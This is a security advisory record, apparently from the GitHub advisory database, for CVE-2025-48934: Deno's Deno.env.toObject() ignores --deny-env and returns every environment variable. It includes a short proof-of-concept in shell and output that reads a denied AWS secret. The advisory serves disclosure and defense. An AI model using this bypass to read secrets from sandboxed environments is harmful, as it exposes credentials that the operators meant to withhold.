advisory_id: GHSA-7w8p-chxq-2789
datasource_id: github_osv_importer_v2/GHSA-7w8p-chxq-2789
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-7w8p-chxq-2789/GHSA-7w8p-chxq-2789.json
aliases:
  - CVE-2025-48934
summary: |
  Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables
  ### Summary
  The [Deno.env.toObject](https://docs.deno.com/api/deno/~/Deno.Env.toObject) method ignores any variables listed in the `--deny-env` option of the `deno run` command. When looking at the [documentation](https://docs.deno.com/runtime/fundamentals/security/#environment-variables) of the `--deny-env` option this might lead to a false impression that variables listed in the option are impossible to read.

  ### PoC

  ```
  export AWS_SECRET_ACCESS_KEY=my-secret-aws-key

  # Works as expected. The program stops with a "NotCapable" error message
  echo 'console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));' | deno run \
    --allow-env \
    --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -

  # All enviroment variables are printed and the --deny-env list is completely disregarded
  echo 'console.log(Deno.env.toObject());' | deno run \
    --allow-env \
    --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -
  ```

  The first example using `get` exits with the following error:
  ```
  error: Uncaught (in promise) NotCapable: Requires env access to "AWS_SECRET_ACCESS_KEY", run again with the --allow-env flag
  console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));
                       ^
      at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)
      at file:///$deno$stdin.mts:1:22
  ```

  The second example  using `toObject` prints all environment variables:
  ```
  [Object: null prototype] {
    ...
    AWS_SECRET_ACCESS_KEY: "my-secret-aws-key",
    ...
  }
  ```

  ### Impact
  Software relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.
impacted_packages: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-7w8p-chxq-2789/GHSA-7w8p-chxq-2789.json
  - score: '5.5'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-7w8p-chxq-2789/GHSA-7w8p-chxq-2789.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-201
references:
  - url: https://docs.deno.com/api/deno/~/Deno.Env.toObject
    reference_type:
    reference_id:
  - url: https://docs.deno.com/runtime/fundamentals/security/#environment-variables
    reference_type:
    reference_id:
  - url: https://github.com/denoland/deno
    reference_type:
    reference_id:
  - url: https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f
    reference_type:
    reference_id:
  - url: https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753
    reference_type:
    reference_id:
  - url: https://github.com/denoland/deno/pull/29079
    reference_type:
    reference_id:
  - url: https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-48934
    reference_type:
    reference_id: CVE-2025-48934
